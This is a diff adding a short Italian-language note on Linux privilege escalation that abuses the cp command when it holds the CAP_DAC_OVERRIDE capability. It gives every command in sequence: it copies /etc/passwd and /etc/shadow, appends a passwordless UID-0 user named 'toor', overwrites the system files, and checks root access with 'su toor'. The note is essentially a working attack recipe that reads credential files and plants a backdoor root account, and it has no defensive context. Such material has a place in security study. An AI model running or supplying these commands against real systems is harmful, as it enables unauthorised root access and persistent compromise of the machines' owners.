@@ -1,0 +1,32 @@
+PRIVESC USANDO IL COMANDO CP CON LA CAP CAP_DAC_OVERRIDE
+
+1. Copia dei file di sistema in directory utente:
+    cp /etc/passwd ~/p
+    cp /etc/shadow ~/s
+
+    Questi comandi copiano i file di sistema `/etc/passwd` e `/etc/shadow` nella tua directory home (`~`), rispettivamente con i nomi `p` e `s`.
+
+2. Creazione di file di lavoro:
+    cat ~/p > ~/passwd
+    cat ~/s > ~/shadow
+
+    Questi comandi leggono il contenuto dei file `p` e `s` e lo scrivono nei file `passwd` e `shadow` nella tua directory home. Essenzialmente, sono copie dei file originali `/etc/passwd` e `/etc/shadow`.
+
+3. Aggiunta di un nuovo utente root:
+    echo "toor:x:0:0::/root:/bin/bash" >> ~/passwd
+    echo "toor::19509:0:99999:7:::" >> ~/shadow
+
+    Questi comandi aggiungono un nuovo utente con il nome `toor` ai file `passwd` e `shadow` copiati. 
+
+    - La riga `toor:x:0:0::/root:/bin/bash` aggiunge un utente `toor` con UID 0 e GID 0 (che sono tipicamente riservati all'utente root) al file `passwd`. L'utente `toor` avrà la home directory `/root` e utilizzerà la shell `/bin/bash`.
+    - La riga `toor::19509:0:99999:7:::` aggiunge l'utente `toor` al file `shadow` senza una password (indicata dai due punti doppi "::"). Il resto dei campi rappresenta informazioni come la data dell'ultima modifica della password, il numero di giorni prima che una password possa essere cambiata, ecc.
+
+4. Sostituzione dei file di sistema con quelli modificati:
+    cp ~/passwd /etc/passwd
+    cp ~/shadow /etc/shadow
+
+    Questi comandi copiano i file modificati `passwd` e `shadow` dalla tua directory home indietro nelle loro posizioni originali (`/etc/passwd` e `/etc/shadow`).
+
+NB: per vedere se funziona fare 'su toor' e vedere se si diventa root (con 'whoami' oppure 'id)
+
+
